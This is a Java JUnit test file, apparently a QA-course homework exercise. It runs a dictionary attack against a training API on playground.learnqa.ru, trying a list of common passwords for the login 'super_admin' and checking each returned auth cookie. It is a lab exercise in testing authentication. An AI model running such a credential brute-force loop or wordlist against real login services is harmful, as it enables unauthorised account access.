import io.restassured.RestAssured;
import io.restassured.path.json.JsonPath;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class HomeWork_Ex9 {

    @Test
    public void Ex9() throws InterruptedException {

        String pass="password,123456,123456789,12345678,12345,qwerty,abc123,football,1234567,monkey,111111,letmein,1234,1234567890,dragon,baseball,sunshine,iloveyou,trustno1,princess,adobe123[a],123123,welcome,login,admin,qwerty123,solo,1q2w3e4r,master,666666,photoshop[a],1qaz2wsx,qwertyuiop,ashley,mustang,121212,starwars,654321,bailey,access,flower,555555,passw0rd,shadow,lovely,7777777,michael,!@#$%^&*,jesus,password1,superman,hello,charlie,888888,696969,hottie,freedom,aa123456,qazwsx,ninja,azerty,loveme,whatever,donald,batman,zaq1zaq1,000000,123qwe";
        List<String> passList = Arrays.asList(pass.split(","));

        boolean rightPass=true;
        int counter = 0;

        while(rightPass==true) {
            Map<String, String> data = new HashMap<>();
            data.put("login","super_admin");
            data.put("password",passList.get(counter));

            Response response= RestAssured
                    .given()
                    .body(data)
                    .when()
                    .post("https://playground.learnqa.ru/api/get_secret_password_homework")
                    .andReturn();

            String responseCookie = response.getCookie("auth_cookie");

            Map<String, String> cookies = new HashMap<>();
            if(responseCookie != null) {
                cookies.put("auth_cookie", responseCookie);
            }

            Response responseCheckAuth= RestAssured
                    .given()
                    .cookies(cookies)
                    .when()
                    .post("https://playground.learnqa.ru/api/check_auth_cookie")
                    .andReturn();

            String responseBody =  responseCheckAuth.asString();

            if(responseBody.equals("You are authorized")) {
                rightPass=false;
                System.out.println("Text of successful authorization: "+responseBody);
                System.out.println("Right pass: "+passList.get(counter));
            }

            counter++;
            if(counter>=passList.size()) {
                System.out.println("Didn't find the correct password!");
                rightPass=false;
            }

        }

    }

}
